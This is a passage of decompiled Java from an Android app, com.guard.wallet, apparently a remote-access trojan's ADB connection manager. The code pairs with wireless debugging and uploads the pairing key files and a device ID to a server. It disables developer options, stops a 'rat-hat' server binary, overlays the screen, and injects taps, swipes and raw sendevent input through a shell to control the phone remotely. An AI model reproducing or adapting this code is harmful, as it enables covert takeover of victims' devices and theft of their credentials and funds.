      // 109: invokespecial java/io/File.<init> (Ljava/lang/String;)V
      // 10c: new java/io/File
      // 10f: astore 3
      // 110: aload 3
      // 111: aload 9
      // 113: invokespecial java/io/File.<init> (Ljava/lang/String;)V
      // 116: aload 8
      // 118: invokevirtual java/io/File.exists ()Z
      // 11b: ifeq 193
      // 11e: aload 3
      // 11f: invokevirtual java/io/File.exists ()Z
      // 122: ifeq 193
      // 125: aload 1
      // 126: aload 8
      // 128: invokevirtual java/util/LinkedList.add (Ljava/lang/Object;)Z
      // 12b: pop
      // 12c: aload 1
      // 12d: aload 3
      // 12e: invokevirtual java/util/LinkedList.add (Ljava/lang/Object;)Z
      // 131: pop
      // 132: getstatic com/guard/wallet/http/l.a Ljava/lang/String;
      // 135: astore 3
      // 136: ldc "deviceId"
      // 138: invokestatic com/guard/wallet/utils/h.l (Ljava/lang/String;)Ljava/lang/String;
      // 13b: astore 9
      // 13d: aload 9
      // 13f: invokestatic a1/q.B (Ljava/lang/Object;)Z
      // 142: ifne 193
      // 145: aload 1
      // 146: invokeinterface java/util/List.isEmpty ()Z 1
      // 14b: ifne 193
      // 14e: new com/guard/wallet/http/d0
      // 151: astore 8
      // 153: aload 8
      // 155: invokespecial com/guard/wallet/http/d0.<init> ()V
      // 158: new com/guard/wallet/req/UploadFileVO
      // 15b: astore 3
      // 15c: aload 3
      // 15d: aload 9
      // 15f: ldc_w "100012"
      // 162: invokespecial com/guard/wallet/req/UploadFileVO.<init> (Ljava/lang/String;Ljava/lang/String;)V
      // 165: new com/guard/wallet/http/i
      // 168: astore 9
      // 16a: aload 9
      // 16c: invokespecial com/guard/wallet/http/i.<init> ()V
      // 16f: aload 9
      // 171: aload 3
      // 172: ldc_w "/api/pairKeyFile/batch.json"
      // 175: aload 1
      // 176: aload 8
      // 178: invokevirtual com/guard/wallet/http/i.j (Lcom/guard/wallet/req/UploadFileVO;Ljava/lang/String;Ljava/util/LinkedList;Lp0/e;)V
      // 17b: goto 193
      // 17e: astore 1
      // 17f: ldc_w "AdbKeyUtils"
      // 182: aload 1
      // 183: invokestatic a1/q.s (Ljava/lang/String;Ljava/lang/Exception;)V
      // 186: goto 193
      // 189: ldc_w "AdbConnectionManager"
      // 18c: ldc_w "无线调试配对失败"
      // 18f: invokestatic android/util/Log.e (Ljava/lang/String;Ljava/lang/String;)I
      // 192: pop
      // 193: aload 0
      // 194: getfield h/e.w Ljava/util/concurrent/atomic/AtomicBoolean;
      // 197: invokevirtual java/util/concurrent/atomic/AtomicBoolean.get ()Z
      // 19a: ifeq 1a2
      // 19d: iload 6
      // 19f: ifeq 1e3
      // 1a2: aload 0
      // 1a3: getfield h/e.w Ljava/util/concurrent/atomic/AtomicBoolean;
      // 1a6: iload 6
      // 1a8: invokevirtual java/util/concurrent/atomic/AtomicBoolean.set (Z)V
      // 1ab: ldc com/guard/wallet/entity/ADBConfig
      // 1ad: monitorenter
      // 1ae: invokestatic com/guard/wallet/utils/h.J ()Lcom/guard/wallet/entity/ADBConfig;
      // 1b1: astore 3
      // 1b2: aload 3
      // 1b3: iload 6
      // 1b5: invokevirtual com/guard/wallet/entity/ADBConfig.setPaired (Z)V
      // 1b8: new java/util/Date
      // 1bb: astore 1
      // 1bc: aload 1
      // 1bd: invokespecial java/util/Date.<init> ()V
      // 1c0: aload 3
      // 1c1: aload 1
      // 1c2: invokevirtual java/util/Date.getTime ()J
      // 1c5: invokevirtual com/guard/wallet/entity/ADBConfig.setUpdateTime (J)V
      // 1c8: aload 3
      // 1c9: invokestatic com/guard/wallet/utils/h.N (Ljava/lang/Object;)Ljava/lang/String;
      // 1cc: ldc_w "ADBConfig"
      // 1cf: invokestatic com/guard/wallet/utils/h.D (Ljava/lang/Object;Ljava/lang/String;)Z
      // 1d2: pop
      // 1d3: aload 3
      // 1d4: invokestatic com/guard/wallet/http/l.p (Lcom/guard/wallet/entity/ADBConfig;)V
      // 1d7: ldc com/guard/wallet/entity/ADBConfig
      // 1d9: monitorexit
      // 1da: goto 1e3
      // 1dd: astore 1
      // 1de: ldc com/guard/wallet/entity/ADBConfig
      // 1e0: monitorexit
      // 1e1: aload 1
      // 1e2: athrow
      // 1e3: aload 0
      // 1e4: getfield h/e.l Ljava/util/concurrent/locks/ReentrantLock;
      // 1e7: invokevirtual java/util/concurrent/locks/ReentrantLock.unlock ()V
      // 1ea: aload 0
      // 1eb: getfield h/e.w Ljava/util/concurrent/atomic/AtomicBoolean;
      // 1ee: invokevirtual java/util/concurrent/atomic/AtomicBoolean.get ()Z
      // 1f1: ireturn
   }

   // $VF: Could not verify finally blocks. A semaphore variable has been added to preserve control flow.
   // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
   public final Integer L() {
      Context var3 = this.i;
      if (var3 != null) {
         AtomicInteger var2 = new AtomicInteger(-1);
         CountDownLatch var4 = new CountDownLatch(1);
         c1.d var10 = new c1.d(var3, "adb-tls-pairing", new c(var2, var4));
         var10.a();
         boolean var7 = false /* VF: Semaphore variable */;

         label40: {
            boolean var1;
            try {
               var7 = true;
               var1 = var4.await(30L, TimeUnit.SECONDS);
               var7 = false;
            } catch (Exception var8) {
               a1.q.s("AdbConnectionManager", var8);
               var7 = false;
               break label40;
            } finally {
               if (var7) {
                  var10.b();
               }
            }

            if (!var1) {
               var10.b();
               return null;
            }
         }

         var10.b();
         AtomicInteger var11 = this.x;
         var11.set(var2.get());
         return var11.get();
      } else {
         return null;
      }
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public final CheckPortResult M() {
      boolean var2 = this.U();
      Object var5 = null;
      Object var4 = null;
      CheckPortResult var3 = (CheckPortResult)var5;
      if (var2) {
         var3 = (CheckPortResult)var5;
         if (this.C() != null) {
            var3 = (CheckPortResult)var5;
            if (this.B() != null) {
               var3 = (CheckPortResult)var5;
               if (com.guard.wallet.utils.g.J()) {
                  ReentrantLock var6 = this.j;
                  var3 = (CheckPortResult)var5;
                  if (var6.tryLock()) {
                     this.v.set(false);
                     ExecutorService var8 = Executors.newFixedThreadPool(2);
                     LinkedList var7 = new LinkedList();
                     int var1 = 1;

                     while (true) {
                        var3 = (CheckPortResult)var4;
                        if (var1 > 4) {
                           label89:
                           while (!var7.isEmpty()) {
                              var5 = var3;

                              Exception var10000;
                              label100: {
                                 ListIterator var9;
                                 try {
                                    var9 = var7.listIterator();
                                 } catch (Exception var17) {
                                    var10000 = var17;
                                    boolean var10001 = false;
                                    break label100;
                                 }

                                 var4 = var3;

                                 while (true) {
                                    var3 = (CheckPortResult)var4;
                                    var5 = var4;

                                    try {
                                       if (!var9.hasNext()) {
                                          continue label89;
                                       }
                                    } catch (Exception var16) {
                                       var10000 = var16;
                                       boolean var22 = false;
                                       break;
                                    }

                                    var5 = var4;

                                    Future var10;
                                    try {
                                       var10 = (Future)var9.next();
                                    } catch (Exception var15) {
                                       var10000 = var15;
                                       boolean var23 = false;
                                       break;
                                    }

                                    var5 = var4;

                                    try {
                                       if (!var10.isDone()) {
                                          continue;
                                       }
                                    } catch (Exception var14) {
                                       var10000 = var14;
                                       boolean var24 = false;
                                       break;
                                    }

                                    var5 = var4;

                                    try {
                                       var3 = (CheckPortResult)var10.get();
                                    } catch (Exception var13) {
                                       var10000 = var13;
                                       boolean var25 = false;
                                       break;
                                    }

                                    var5 = var4;

                                    try {
                                       var10.cancel(true);
                                    } catch (Exception var12) {
                                       var10000 = var12;
                                       boolean var26 = false;
                                       break;
                                    }

                                    var5 = var4;

                                    try {
                                       var9.remove();
                                    } catch (Exception var11) {
                                       var10000 = var11;
                                       boolean var27 = false;
                                       break;
                                    }

                                    if (var3 != null) {
                                       var4 = var3;
                                    }
                                 }
                              }

                              var4 = var10000;
                              var3 = (CheckPortResult)var5;
                              if (!a1.q.B(var4.getMessage())) {
                                 a1.q.s("AdbConnectionManager", (Exception)var4);
                                 var3 = (CheckPortResult)var5;
                              }
                           }

                           var8.shutdown();
                           var6.unlock();
                           break;
                        }

                        var7.add(var8.submit(new p.a((var1 - 1) * 5000 + 30000, var1 * 5000 + 30000 - 1, 2)));
                        var1++;
                     }
                  }
               }
            }
         }
      }

      return var3;
   }

   public final boolean N(String var1) {
      boolean var3 = a1.q.B(var1);
      boolean var2 = false;
      if (var3) {
         return false;
      } else {
         i.a var5 = new i.a("Success", true, 1);
         i.a var4 = new i.a("Failed", true, 1);
         if (this.P(a.a.l("if ", var1, "; then echo \"Success\"; else echo \"Failed\"; fi"), var5, var4) == 1) {
            var2 = true;
         }

         return var2;
      }
   }

   public final void O(String var1) {
      if (!a1.q.B(var1)) {
         try {
            b1.h var2 = this.E(new String[0], 1);
            var2.B(2000L);
            b1.e var3 = new b1.e(var2);
            var3.write(String.format("%1$s\n", var1).getBytes(StandardCharsets.UTF_8));
            var3.flush();
            var3.flush();
            var2.close();
         } catch (Exception var4) {
            a1.q.s("AdbConnectionManager", var4);
         }
      }
   }

   public final int P(String var1, i.a var2, i.a var3) {
      LinkedList var4 = new LinkedList();
      LinkedList var5 = new LinkedList();
      var4.add(var2);
      var5.add(var3);
      return this.Q(var1, var4, var5);
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public final int Q(String var1, LinkedList var2, LinkedList var3) {
      if (a1.q.B(var1)) {
         return 5;
      } else {
         Exception var10000;
         label98: {
            boolean var5;
            try {
               var17 = this.E(new String[]{var1}, 1);
               var17.B(5000L);
               var5 = var2.isEmpty();
            } catch (Exception var16) {
               var10000 = var16;
               boolean var10001 = false;
               break label98;
            }

            LinkedList var6 = var17.i;
            if (!var5) {
               try {
                  var6.addAll(var2);
               } catch (Exception var15) {
                  var10000 = var15;
                  boolean var22 = false;
                  break label98;
               }
            }

            AtomicInteger var19 = var17.k;

            try {
               var19.set(-1);
               var5 = var3.isEmpty();
            } catch (Exception var14) {
               var10000 = var14;
               boolean var23 = false;
               break label98;
            }

            LinkedList var7 = var17.j;
            if (!var5) {
               try {
                  var7.addAll(var3);
               } catch (Exception var13) {
                  var10000 = var13;
                  boolean var24 = false;
                  break label98;
               }
            }

            try {
               var19.set(-1);
            } catch (Exception var11) {
               var10000 = var11;
               boolean var25 = false;
               break label98;
            }

            while (true) {
               boolean var4;
               label66: {
                  label65: {
                     try {
                        if (var6.isEmpty() && var7.isEmpty()) {
                           break label65;
                        }
                     } catch (Exception var12) {
                        var10000 = var12;
                        boolean var26 = false;
                        break;
                     }

                     var4 = 1;
                     break label66;
                  }

                  var4 = 0;
               }

               if (var4) {
                  try {
                     var4 = var19.get();
                  } catch (Exception var10) {
                     var10000 = var10;
                     boolean var28 = false;
                     break;
                  }

                  if (var4 != 0 && var4 != 1 && var4 != 5) {
                     continue;
                  }

                  try {
                     var17.close();
                     return var4;
                  } catch (Exception var8) {
                     var10000 = var8;
                     boolean var29 = false;
                     break;
                  }
               }

               try {
                  var17.close();
                  return 5;
               } catch (Exception var9) {
                  var10000 = var9;
                  boolean var27 = false;
                  break;
               }
            }
         }

         Exception var18 = var10000;
         a1.q.s("AdbConnectionManager", var18);
         return 5;
      }
   }

   public final void R(boolean param1) {
      // $VF: Couldn't be decompiled
      // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
      // java.lang.RuntimeException: parsing failure!
      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.DomHelper.parseGraph(DomHelper.java:211)
      //   at org.jetbrains.java.decompiler.main.rels.MethodProcessor.codeToJava(MethodProcessor.java:166)
      //
      // Bytecode:
      // 00: bipush 1
      // 01: istore 2
      // 02: iload 1
      // 03: ifeq 0e
      // 06: aload 0
      // 07: getfield h/e.A Ljava/util/concurrent/atomic/AtomicBoolean;
      // 0a: bipush 1
      // 0b: invokevirtual java/util/concurrent/atomic/AtomicBoolean.set (Z)V
      // 0e: invokestatic e/b.c ()Z
      // 11: ifeq 17
      // 14: invokestatic e/b.d ()V
      // 17: invokestatic com/guard/wallet/helper/g.c ()V
      // 1a: invokestatic com/guard/wallet/service/MyAccessibilityService.P ()Lcom/guard/wallet/service/MyAccessibilityService;
      // 1d: ifnull 26
      // 20: invokestatic com/guard/wallet/service/MyAccessibilityService.P ()Lcom/guard/wallet/service/MyAccessibilityService;
      // 23: invokevirtual com/guard/wallet/service/AccessibilityDelegateManager.v ()V
      // 26: iload 1
      // 27: ifeq a8
      // 2a: aload 0
      // 2b: getfield h/e.k Ljava/util/concurrent/locks/ReentrantLock;
      // 2e: invokevirtual java/util/concurrent/locks/ReentrantLock.tryLock ()Z
      // 31: ifeq a8
      // 34: aload 0
      // 35: ldc_w "/data/local/tmp/rat-hat server --stop"
      // 38: invokevirtual h/e.N (Ljava/lang/String;)Z
      // 3b: ifeq a1
      // 3e: bipush 25
      // 40: invokestatic com/guard/wallet/utils/g.T0 (I)V
      // 43: aload 0
      // 44: ldc_w "exit"
      // 47: invokevirtual h/e.O (Ljava/lang/String;)V
      // 4a: aload 0
      // 4b: getfield h/e.j Ljava/util/concurrent/locks/ReentrantLock;
      // 4e: invokevirtual java/util/concurrent/locks/ReentrantLock.tryLock ()Z
      // 51: ifeq a1
      // 54: aload 0
      // 55: getfield b1/b.a Ljava/lang/Object;
      // 58: astore 3
      // 59: aload 3
      // 5a: monitorenter
      // 5b: aload 0
      // 5c: getfield b1/b.b Lb1/d;
      // 5f: astore 4
      // 61: aload 4
      // 63: ifnull 75
      // 66: aload 4
      // 68: invokevirtual b1/d.close ()V
      // 6b: aload 0
      // 6c: aconst_null
      // 6d: putfield b1/b.b Lb1/d;
      // 70: aload 3
      // 71: monitorexit
      // 72: goto 79
      // 75: aload 3
      // 76: monitorexit
      // 77: bipush 0
      // 78: istore 2
      // 79: iload 2
      // 7a: ifeq 9a
      // 7d: aload 0
      // 7e: getfield h/e.u Ljava/util/concurrent/atomic/AtomicBoolean;
      // 81: bipush 0
      // 82: invokevirtual java/util/concurrent/atomic/AtomicBoolean.set (Z)V
      // 85: invokestatic com/guard/wallet/utils/h.p ()V
      // 88: goto 9a
      // 8b: astore 4
      // 8d: aload 3
      // 8e: monitorexit
      // 8f: aload 4
      // 91: athrow
      // 92: astore 3
      // 93: ldc_w "AdbConnectionManager"
      // 96: aload 3
      // 97: invokestatic a1/q.s (Ljava/lang/String;Ljava/lang/Exception;)V
      // 9a: aload 0
      // 9b: getfield h/e.j Ljava/util/concurrent/locks/ReentrantLock;
      // 9e: invokevirtual java/util/concurrent/locks/ReentrantLock.unlock ()V
      // a1: aload 0
      // a2: getfield h/e.k Ljava/util/concurrent/locks/ReentrantLock;
      // a5: invokevirtual java/util/concurrent/locks/ReentrantLock.unlock ()V
      // a8: return
   }

   public final boolean U() {
      // $VF: Couldn't be decompiled
      // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
      //
      // Bytecode:
      // 00: ldc com/guard/wallet/entity/ADBConfig
      // 02: monitorenter
      // 03: invokestatic com/guard/wallet/utils/h.J ()Lcom/guard/wallet/entity/ADBConfig;
      // 06: invokevirtual com/guard/wallet/entity/ADBConfig.isPaired ()Z
      // 09: istore 1
      // 0a: ldc com/guard/wallet/entity/ADBConfig
      // 0c: monitorexit
      // 0d: aload 0
      // 0e: getfield h/e.w Ljava/util/concurrent/atomic/AtomicBoolean;
      // 11: astore 2
      // 12: iload 1
      // 13: ifeq 31
      // 16: ldc com/guard/wallet/entity/ADBConfig
      // 18: monitorenter
      // 19: invokestatic com/guard/wallet/utils/h.J ()Lcom/guard/wallet/entity/ADBConfig;
      // 1c: invokevirtual com/guard/wallet/entity/ADBConfig.isPaired ()Z
      // 1f: istore 1
      // 20: ldc com/guard/wallet/entity/ADBConfig
      // 22: monitorexit
      // 23: aload 2
      // 24: iload 1
      // 25: invokevirtual java/util/concurrent/atomic/AtomicBoolean.set (Z)V
      // 28: goto 31
      // 2b: astore 2
      // 2c: ldc com/guard/wallet/entity/ADBConfig
      // 2e: monitorexit
      // 2f: aload 2
      // 30: athrow
      // 31: aload 2
      // 32: invokevirtual java/util/concurrent/atomic/AtomicBoolean.get ()Z
      // 35: ireturn
      // 36: astore 2
      // 37: ldc com/guard/wallet/entity/ADBConfig
      // 39: monitorexit
      // 3a: aload 2
      // 3b: athrow
   }

   public final void V() {
      if (VERSION.SDK_INT > 29 && !MyAccessibilityService.P().p() && MyAccessibilityService.P().n() == null && !MyAccessibilityService.P().h()) {
         Log.d("AdbConnectionManager", "保持关闭开发者选项");
         if (com.guard.wallet.utils.g.K() && this.U() && com.guard.wallet.utils.g.b() && this.D()) {
            Log.d("AdbConnectionManager", "无线调试已配对、无线调试已连接 关闭开发者选项");
            com.guard.wallet.http.l.e();
         }
      }
   }

   public final boolean W(LinkedList var1) {
      if (!var1.isEmpty() && this.D()) {
         LinkedList var4 = new LinkedList();

         for (int var2 = 0; var2 < var1.size(); var2++) {
            Point var3 = (Point)var1.get(var2);
            Locale var5 = Locale.getDefault();
            String var6;
            if (var2 == 0) {
               var6 = String.format(var5, "input motionevent DOWN %.0f %.0f", var3.getX(), var3.getY());
            } else {
               var4.add(String.format(var5, "input motionevent MOVE %.0f %.0f", var3.getX(), var3.getY()));
               if (var2 != var1.size() - 1) {
                  continue;
               }

               var6 = String.format(Locale.getDefault(), "input motionevent UP %.0f %.0f", var3.getX(), var3.getY());
            }

            var4.add(var6);
         }

         if (!var4.isEmpty()) {
            return this.N(TextUtils.join(" && ", var4));
         }
      }

      return false;
   }

   public final boolean X() {
      // $VF: Couldn't be decompiled
      // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
      //
      // Bytecode:
      // 000: invokestatic com/guard/wallet/service/MyAccessibilityService.P ()Lcom/guard/wallet/service/MyAccessibilityService;
      // 003: ifnonnull 01c
      // 006: getstatic com/guard/wallet/service/MyAccessibilityService.r Ljava/util/concurrent/atomic/AtomicBoolean;
      // 009: invokevirtual java/util/concurrent/atomic/AtomicBoolean.get ()Z
      // 00c: ifeq 011
      // 00f: bipush 0
      // 010: ireturn
      // 011: invokestatic com/guard/wallet/utils/g.L ()Z
      // 014: ifne 01a
      // 017: invokestatic com/guard/wallet/utils/b.e ()V
      // 01a: bipush 0
      // 01b: ireturn
      // 01c: invokestatic com/guard/wallet/utils/g.b ()Z
      // 01f: ifeq 024
      // 022: bipush 0
      // 023: ireturn
      // 024: ldc com/guard/wallet/utils/h
      // 026: monitorenter
      // 027: ldc_w "adbCanWriteSecure"
      // 02a: invokestatic com/guard/wallet/utils/h.e (Ljava/lang/String;)Z
      // 02d: istore 2
      // 02e: ldc com/guard/wallet/utils/h
      // 030: monitorexit
      // 031: iload 2
      // 032: ifeq 037
      // 035: bipush 0
      // 036: ireturn
      // 037: aload 0
      // 038: getfield h/e.A Ljava/util/concurrent/atomic/AtomicBoolean;
      // 03b: invokevirtual java/util/concurrent/atomic/AtomicBoolean.get ()Z
      // 03e: ifeq 043
      // 041: bipush 0
      // 042: ireturn
      // 043: invokestatic com/guard/wallet/service/MyAccessibilityService.P ()Lcom/guard/wallet/service/MyAccessibilityService;
      // 046: invokevirtual com/guard/wallet/service/AccessibilityDelegateManager.j ()Z
      // 049: ifeq 04e
      // 04c: bipush 0
      // 04d: ireturn
      // 04e: invokestatic w/a.a ()Z
      // 051: ifeq 056
      // 054: bipush 0
      // 055: ireturn
      // 056: ldc_w "AdbConnectionManager"
      // 059: ldc_w "openWriteSecure openWriteSecure "
      // 05c: invokestatic android/util/Log.d (Ljava/lang/String;Ljava/lang/String;)I
      // 05f: pop
      // 060: invokestatic com/guard/wallet/utils/h.n ()Z
      // 063: ifne 074
      // 066: invokestatic com/guard/wallet/utils/h.o ()Z
      // 069: ifeq 06f
      // 06c: goto 074
      // 06f: bipush 0
      // 070: istore 1
      // 071: goto 076
      // 074: bipush 1
      // 075: istore 1
      // 076: invokestatic com/guard/wallet/utils/h.o ()Z
      // 079: ifne 07f
      // 07c: invokestatic com/guard/wallet/http/l.c ()V
      // 07f: invokestatic com/guard/wallet/utils/g.K ()Z
      // 082: ifne 088
      // 085: invokestatic h/e.Z ()V
      // 088: invokestatic com/guard/wallet/utils/g.K ()Z
      // 08b: ifne 090
      // 08e: bipush 0
      // 08f: ireturn
      // 090: invokestatic com/guard/wallet/utils/g.p0 ()Z
      // 093: ifeq 0a2
      // 096: invokestatic com/guard/wallet/utils/g.r0 ()Z
      // 099: ifeq 0a2
      // 09c: iload 1
      // 09d: ifne 0a2
      // 0a0: bipush 0
      // 0a1: ireturn
      // 0a2: new com/guard/wallet/req/BlockViewVO
      // 0a5: dup
      // 0a6: bipush 0
      // 0a7: aconst_null
      // 0a8: bipush 1
      // 0a9: bipush 1
      // 0aa: invokespecial com/guard/wallet/req/BlockViewVO.<init> (ZLjava/lang/String;ZZ)V
      // 0ad: astore 3
      // 0ae: invokestatic com/guard/wallet/utils/e.j ()Z
      // 0b1: ifeq 0c2
      // 0b4: invokestatic com/guard/wallet/service/MyAccessibilityService.P ()Lcom/guard/wallet/service/MyAccessibilityService;
      // 0b7: invokevirtual java/lang/Object.getClass ()Ljava/lang/Class;
      // 0ba: pop
      // 0bb: aload 3
      // 0bc: invokestatic com/guard/wallet/service/MyAccessibilityService.o0 ()Landroid/graphics/drawable/BitmapDrawable;
      // 0bf: invokevirtual com/guard/wallet/req/BlockViewVO.setBlockDrawable (Landroid/graphics/drawable/Drawable;)V
      // 0c2: aload 3
      // 0c3: invokestatic com/guard/wallet/helper/g.a (Lcom/guard/wallet/req/BlockViewVO;)Z
      // 0c6: pop
      // 0c7: aconst_null
      // 0c8: invokestatic com/guard/wallet/utils/g.p1 (Lcom/guard/wallet/req/ReqUnlockDeviceVO;)Z
      // 0cb: ifne 0d3
      // 0ce: invokestatic com/guard/wallet/helper/g.c ()V
      // 0d1: bipush 0
      // 0d2: ireturn
      // 0d3: invokestatic a1/q.G ()Z
      // 0d6: ifeq 0ec
      // 0d9: invokestatic a1/q.A ()Z
      // 0dc: ifne 0ec
      // 0df: aconst_null
      // 0e0: aconst_null
      // 0e1: invokestatic a1/q.O (Ljava/lang/String;Ljava/lang/String;)Z
      // 0e4: ifne 0ec
      // 0e7: invokestatic com/guard/wallet/helper/g.c ()V
      // 0ea: bipush 0
      // 0eb: ireturn
      // 0ec: getstatic e/b.a Le/b;
      // 0ef: ifnull 0fb
      // 0f2: invokestatic com/guard/wallet/utils/e.l ()Z
      // 0f5: ifeq 0fb
      // 0f8: invokestatic e/b.e ()V
      // 0fb: ldc_w "ENABLE_SECURE_RUNNING_EVENT"
      // 0fe: invokestatic com/guard/wallet/http/l.t (Ljava/lang/String;)V
      // 101: invokestatic com/guard/wallet/service/MyAccessibilityService.P ()Lcom/guard/wallet/service/MyAccessibilityService;
      // 104: astore 3
      // 105: aload 3
      // 106: invokevirtual java/lang/Object.getClass ()Ljava/lang/Class;
      // 109: pop
      // 10a: aload 3
      // 10b: invokevirtual com/guard/wallet/service/AccessibilityDelegateManager.h ()Z
      // 10e: ifeq 115
      // 111: aload 3
      // 112: invokevirtual com/guard/wallet/service/AccessibilityDelegateManager.v ()V
      // 115: aload 3
      // 116: getfield com/guard/wallet/service/AccessibilityDelegateManager.a Ljava/util/concurrent/ConcurrentLinkedQueue;
      // 119: astore 4
      // 11b: new o/k
      // 11e: astore 5
      // 120: aload 5
      // 122: invokespecial o/k.<init> ()V
      // 125: aload 4
      // 127: aload 5
      // 129: invokevirtual java/util/concurrent/ConcurrentLinkedQueue.add (Ljava/lang/Object;)Z
      // 12c: pop
      // 12d: invokestatic o/k.J ()Ljava/util/LinkedList;
      // 130: astore 4
      // 132: aload 3
      // 133: ldc_w o/k
      // 136: invokevirtual java/lang/Class.getName ()Ljava/lang/String;
      // 139: aload 4
      // 13b: invokevirtual com/guard/wallet/service/AccessibilityDelegateManager.t (Ljava/lang/String;Ljava/util/List;)V
      // 13e: goto 149
      // 141: astore 3
      // 142: ldc_w "com.guard.wallet.service.AccessibilityDelegateManager"
      // 145: aload 3
      // 146: invokestatic a1/q.s (Ljava/lang/String;Ljava/lang/Exception;)V
      // 149: bipush 10
      // 14b: invokestatic com/guard/wallet/utils/g.T0 (I)V
      // 14e: invokestatic com/guard/wallet/utils/g.f1 ()Z
      // 151: pop
      // 152: bipush 1
      // 153: ireturn
      // 154: astore 3
      // 155: ldc com/guard/wallet/utils/h
      // 157: monitorexit
      // 158: aload 3
      // 159: athrow
   }

   public final boolean b0(List var1) {
      if (!var1.isEmpty() && this.D()) {
         LinkedList var4 = new LinkedList();

         for (int var2 = 0; var2 < var1.size(); var2++) {
            TouchEvent var3 = (TouchEvent)var1.get(var2);
            String var5;
            if (!a1.q.B(var3.getValue())) {
               var5 = String.format(Locale.getDefault(), "sendevent %s %s %s %s", var3.getDeviceName(), var3.getTypeName(), var3.getCodeName(), var3.getValue());
            } else {
               var5 = String.format(Locale.getDefault(), "sendevent %s %s %s", var3.getDeviceName(), var3.getTypeName(), var3.getCodeName());
            }

            var4.add(var5);
         }

         if (!var4.isEmpty()) {
            return this.N(TextUtils.join(" && ", var4));
         }
      }

      return false;
   }

   public final boolean c0(List var1) {
      boolean var6 = false;
      boolean var5 = var6;
      if (var1 != null) {
         var5 = var6;
         if (!var1.isEmpty()) {
            var5 = var6;
            if (this.D()) {
               Iterator var7 = var1.iterator();
               int var3 = 0;
               int var2 = 0;

               while (var7.hasNext()) {
                  Point var8 = (Point)var7.next();
                  if (var8 != null && var8.getX() >= 0.0F && var8.getY() >= 0.0F) {
                     try {
                        Thread.sleep(400L);
                     } catch (Exception var9) {
                        a1.q.s("AdbConnectionManager", var9);
                     }

                     int var4 = var2 + 1;
                     var2 = var4;
                     if (this.N(String.format(Locale.getDefault(), "input tap %.0f %.0f", var8.getX(), var8.getY()))) {
                        var3++;
                        var2 = var4;
                     }
                  }
               }

               var5 = var6;
               if (var3 == var2) {
                  var5 = true;
               }
            }
         }
      }

      return var5;
   }

   @Override
   public final void close() {
      this.o.shutdownNow();
      this.p.shutdownNow();
      this.r.clear();
      this.q.shutdownNow();
      super.close();
   }
}
